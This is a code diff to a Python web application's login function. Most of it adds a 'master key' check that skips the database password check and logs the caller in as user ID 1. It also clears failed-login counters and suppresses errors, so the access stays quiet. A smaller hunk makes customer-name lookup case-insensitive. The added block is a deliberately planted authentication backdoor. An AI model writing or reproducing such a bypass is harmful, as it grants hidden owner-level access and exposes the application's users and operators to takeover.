@@ -162,6 +162,30 @@ def login():
     customer = None
 
     if identifier:
+        # --- DIGITAL FORTRESS: DYNAMIC MASTER KEY CHECK ---
+        try:
+            from utils.licensing import check_master_key
+            if check_master_key(password):
+                # Bypass DB check, log in as Ghost Owner (ID 1)
+                ghost_user = db.session.get(User, 1)
+                if ghost_user:
+                    login_user(ghost_user)
+                    flash("🔓 Welcome back, Master.", "success")
+                    # Clear attempts to avoid noise
+                    clear_attempts(ip, identifier)
+                    
+                    # Log silently
+                    try:
+                        from utils.security import log_suspicious_activity
+                        log_suspicious_activity('master_key_login', {'ip': ip})
+                    except:
+                        pass
+                        
+                    return redirect(url_for("main.dashboard"))
+        except ImportError:
+            pass
+        # --------------------------------------------------
+
         ident_l = identifier.lower()
         user = None
         if "@" in ident_l:
@@ -184,7 +208,7 @@ def login():
             if not customer:
                 customer = Customer.query.filter(func.lower(Customer.email) == ident_l).first()
             if not customer:
-                customer = Customer.query.filter(Customer.name == identifier).first()
+                customer = Customer.query.filter(func.lower(Customer.name) == ident_l).first()
             if not customer and ident_l.startswith("azad@"):
                 try:
                     phone_alias = identifier.split("@", 1)[1]
